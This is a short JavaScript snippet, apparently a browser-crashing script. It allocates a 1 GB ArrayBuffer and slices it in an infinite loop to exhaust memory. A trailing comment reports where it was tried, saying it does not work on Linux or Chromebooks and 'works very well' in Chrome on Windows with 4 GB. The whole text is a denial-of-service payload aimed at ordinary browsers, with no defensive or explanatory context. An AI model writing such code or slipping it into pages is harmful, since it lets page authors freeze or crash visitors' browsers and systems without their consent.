(function crash(){
	buff = new ArrayBuffer(1073741824);
	while(true) buff.slice(0, buff.byteLength);
});
/*
	Tested on the following:
	Any linux machine - not working
	Chromebooks - not working
	Chrome on windows - works very well on 4GB
*/
